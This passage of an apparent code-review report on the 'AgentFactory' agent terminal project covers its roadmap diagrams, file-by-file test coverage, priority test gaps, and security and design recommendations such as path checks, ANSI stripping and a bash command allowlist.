flowchart TD
    W2_DONE["Wave 2 ✅\nITUI Canvas complete"]

    subgraph W3["Wave 3 — Orchestration (not started)"]
        W3A["schema.ts\naf-plan.json Zod schema\nStep · dependencies · agent · tool"]
        W3B["graph.ts\nTopological sort\nCycle detection\nParallel grouping"]
        W3C["executor.ts\nDAG runner\nStep lifecycle: pending→running→done→error\nParallel step groups"]
        W3D["planner.ts\nInteractive /plan new wizard\nStep builder inside SessionPanel"]
    end

    subgraph W4["Wave 4 — PTY Terminal (not started)"]
        W4A["TerminalPanel.ts\nnode-pty PseudoTerminal\nShell embed in 4th panel\nInput passthrough · resize events"]
    end

    subgraph W5["Wave 5 — Registry + Harness (not started)"]
        W5A["harness/reader.ts\n.ai/ directory traversal\nLoad AgentFactory.md context"]
        W5B["harness/manifest.ts\nagent-manifest.json parser\nAgent capability declarations"]
        W5C["registry/client.ts\nagentfactory.dev REST\nfetch/list/publish agents"]
        W5D["registry/auth.ts\n~/.agentfactory/token\nToken validation + refresh"]
    end

    W2_DONE --> W3
    W3 --> W4
    W4 --> W5

    W3A --> W3B --> W3C --> W3D

    style W3 fill:#fff9c4,stroke:#f9a825
    style W4 fill:#fce4ec,stroke:#e91e63
    style W5 fill:#e8f5e9,stroke:#4caf50
```

---

### Gap 6: AgentTool Missing (Wave 1 Planned)

`CommandPalette.ts` and `AgentTool.ts` are listed as Wave 1 items in `project-index.yml` but were not implemented. Both are dependencies of later waves:

- `AgentTool` — needed for `/spawn <agent>` slash command and multi-agent orchestration
- `CommandPalette` — needed for discoverability of slash commands and plan steps

---

## Component Status Matrix

```mermaid
flowchart TD
    subgraph GREEN["✅ Implemented and tested (8 files)"]
        G1["agent-loop.ts\n4 tests"]
        G2["session.ts\n6 tests"]
        G3["tools/bash.ts\n5 tests"]
        G4["tools/read.ts\n4 tests"]
        G5["mouse.ts\n11 tests"]
        G6["cell-buffer.ts\n4 tests"]
        G7["Wire.ts\n6 tests"]
        G8["OrchestrationCanvas.ts\n6 tests"]
    end

    subgraph YELLOW["🟡 Implemented, no tests (19 files)"]
        Y1["app.ts"]
        Y2["cli.ts"]
        Y3["index.ts"]
        Y4["hooks.ts ⚠ critical path"]
        Y5["tools/index.ts ⚠ registry"]
        Y6["tools/write.ts ⚠ destructive"]
        Y7["tools/web-fetch.ts"]
        Y8["doctor.ts"]
        Y9["keyboard.ts"]
        Y10["router.ts"]
        Y11["Panel.ts (abstract)"]
        Y12["SessionPanel.ts ⚠ core UI"]
        Y13["AgentsPanel.ts"]
        Y14["StatusBar.ts"]
        Y15["ansi.ts"]
        Y16["layout.ts"]
        Y17["theme.ts"]
        Y18["Block.ts"]
        Y19["ContextMenu.ts"]
    end

    subgraph GREY["⏳ Planned, not started (11 modules)"]
        P1["schema.ts W3"]
        P2["executor.ts W3"]
        P3["planner.ts W3"]
        P4["graph.ts W3"]
        P5["TerminalPanel.ts W4"]
        P6["CommandPalette.ts W1"]
        P7["AgentTool.ts W1"]
        P8["harness/reader.ts W5"]
        P9["harness/manifest.ts W5"]
        P10["registry/client.ts W5"]
        P11["registry/auth.ts W5"]
    end
```

---

## Test Coverage Report

### Coverage at a Glance

```mermaid
pie title Test coverage by file count
    "Tested (8 files)" : 8
    "Untested — implemented (19 files)" : 19
    "Planned — not started (11 files)" : 11
```

### What Each Test File Covers

| Test File | Tests | What it proves | Gaps |
|-----------|-------|----------------|------|
| `agent-loop.test.ts` | 4 | text streaming, turn_end, message history, AbortSignal | Hook preemption, maxTurns exceeded, API error path |
| `session.test.ts` | 6 | ordering, readonly, token count, clear | Max size eviction (feature not yet implemented) |
| `bash.test.ts` | 5 | stdout, stderr, exit codes, Zod validation | Timeout expiry (test mentioned but missing), concurrent flag |
| `read.test.ts` | 4 | happy path, missing file error, Zod validation, concurrent flag | Binary files, symlinks, large files |
| `mouse.test.ts` | 11 | all button types, modifiers, coords, motion | Malformed SGR strings, integer overflow bounds |
| `cell-buffer.test.ts` | 4 | write, boundary clip, clone, diff | Color/style inheritance, unicode chars, large buffers |
| `wire.test.ts` | 6 | L-shape, same-row, arrow terminal, no dupes | Self-loops, very long wires, overlapping wires |
| `orchestration-canvas.test.ts` | 6 | drag state machine, snap-to-grid, hit test, context menu, boundary | Overlapping blocks, wire deletion, multi-block drag |

### Priority Test Gaps

| File | Priority | Why |
|------|----------|-----|
| `hooks.ts` | 🔴 Critical | Executes shell scripts — highest risk, zero coverage |
| `tools/write.ts` | 🔴 High | Writes to filesystem — destructive, untested |
| `tools/index.ts` | 🔴 High | Core dispatch + registry — untested |
| `keyboard.ts` | 🔴 High | All key parsing — zero tests |
| `SessionPanel.ts` | 🟠 High | Core UI panel + agentLoop integration |
| `router.ts` | 🟠 High | Event dispatch correctness |
| `tools/web-fetch.ts` | 🟠 High | External HTTP calls |
| `app.ts` | 🟠 Medium | Terminal lifecycle (hard to unit-test, needs integration test) |
| `doctor.ts` | 🟡 Medium | Health checks — straightforward to test |
| `Block.ts` | 🟡 Medium | Rendering logic |
| `ContextMenu.ts` | 🟡 Medium | Menu navigation |
| `layout.ts` | 🟡 Medium | Layout computation |

**Rule 7 compliance gap**: 19 source files have zero tests. Reaching 80% file coverage requires adding tests for the 11 high/medium priority files above.

---

## Recommendations

### Immediate — Security (fix before public use or multi-user deployment)

| # | Action | File | Effort |
|---|--------|------|--------|
| R1 | Add `assertSafePath()` to Read and Write tools | `tools/read.ts`, `tools/write.ts` | 1h |
| R2 | Strip ANSI escape codes from tool output before display | `SessionPanel.ts` | 30m |
| R3 | Add `path.resolve()` + prefix check to hook path builder | `hooks.ts` | 30m |
| R4 | Replace `HOOK_CTX` env var with stdin pipe | `hooks.ts` | 2h |
| R5 | Yield `error` event on `JSON.parse` failure | `agent-loop.ts` | 30m |
| R6 | Add API error redaction wrapper | `agent-loop.ts` | 1h |
| R7 | Add session history max size (e.g. 200 messages) | `session.ts` | 30m |

### Short-term — Design completeness

| # | Action | File | Effort |
|---|--------|------|--------|
| R8 | Implement shared `AppState` event bus | new `src/state/app-state.ts` | 1 day |
| R9 | Canvas `serialize()` / `deserialize()` (stub until schema.ts exists) | `OrchestrationCanvas.ts` | 4h |
| R10 | Session history persistence to `~/.agentfactory/sessions/` | `session.ts` | 4h |
| R11 | Restrict BashTool with `execFile` + command allowlist | `tools/bash.ts` | 3h |
| R12 | Hook stdout capture and structured response | `hooks.ts` | 3h |
| R13 | Two-step confirmation for ContextMenu delete actions | `ContextMenu.ts` | 1h |

### Wave 3 prerequisites (before starting orchestration)

| # | Action | Dependency |
|---|--------|-----------|
| R14 | Define and test `schema.ts` Zod schema for `af-plan.json` | Unblocks executor, planner, canvas ↔ plan bridge |
| R15 | Implement `graph.ts` topological sort with cycle detection | Reference: `open-multi-agent/src/task/index.ts` for DAG patterns |
| R16 | Canvas ↔ schema bridge: `Block[]` + `CanvasWire[]` ↔ `Plan` | Connects UI to execution engine |
| R17 | Implement `AppState` event bus before writing executor | Canvas status updates require shared state |

### Test coverage (Rule 7 — reach 80%)

| # | Test file to add | Tests to write |
|---|-----------------|----------------|
| R18 | `hooks.test.ts` | runHook with/without .sh file, PreToolUse blocking, PostToolUse passthrough, env isolation |
| R19 | `tools/write.test.ts` | file creation, directory creation, path traversal rejection (after R1) |
| R20 | `tools/index.test.ts` | registerTool, getTool, listTools, dispatch happy path, dispatch unknown tool |
| R21 | `keyboard.test.ts` | printable chars, ctrl combos, arrow keys, special keys, escape |
| R22 | `SessionPanel.test.ts` | message display, input accumulation, slash commands, streaming mock |
| R23 | `router.test.ts` | keyboard to focused panel, mouse to hit panel, no-hit pass-through |
| R24 | `tools/web-fetch.test.ts` | successful fetch, 404 handling, network error |

---

*End of review. All findings derive from static analysis of source files at commit `9dc784c` on branch `feature/ref-repos-permanent`.*
